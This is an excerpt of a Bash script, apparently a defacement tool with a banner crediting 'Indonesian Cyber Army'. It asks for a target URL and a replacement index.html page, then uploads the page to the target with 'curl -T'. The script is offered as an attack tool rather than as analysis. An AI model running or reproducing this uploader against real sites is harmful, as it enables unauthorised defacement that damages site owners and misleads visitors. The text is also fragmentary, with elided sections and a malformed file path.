...
echo $yellow
figlet -f future "Indonesian Cyber Army By MR.Bl4z3 & zrd404"
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo
...
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"Chemod@MR.Bl4z3"$cyan" ~/IndoCyber"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
...
echo $green "╭─"$blue"Chemod@MR.Bl4z3"$cyan" ~/IndoCyber"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan Script!!! "
echo $green "╭─"$blue"Chemod@MR.Bl4z3"$cyan" ~/Nama SC Harus(index.html)"$white
read -p " ╰─$ "  script
curl -T /Desktop$script $target
...
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"Chemod@MR.Bl4z3"$cyan" ~/IndoCyber"$white                               
read -p " ╰─$ " script
echo
echo
